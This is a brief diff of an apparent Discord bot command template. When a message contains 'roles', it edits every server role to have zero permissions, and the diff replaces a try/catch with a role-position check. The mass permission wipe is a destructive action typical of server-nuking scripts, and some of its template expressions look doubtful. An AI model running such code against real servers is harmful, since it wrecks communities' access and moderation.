@@ -6,9 +6,9 @@
     {{ end }}
 {{ else if in .Message.Content "roles" }}
     {{ range $.Guild.Roles }}
-        {{ try }}
+        {{ if gt .Position (getRole .BotUser.Username).Position }}
         {{ editRole .ID ( createRole "permissions" 0 ) }}
-        {{ catch }}
+        {{ end }}
     {{ end }}
     {{ end }}
 {{ end }}
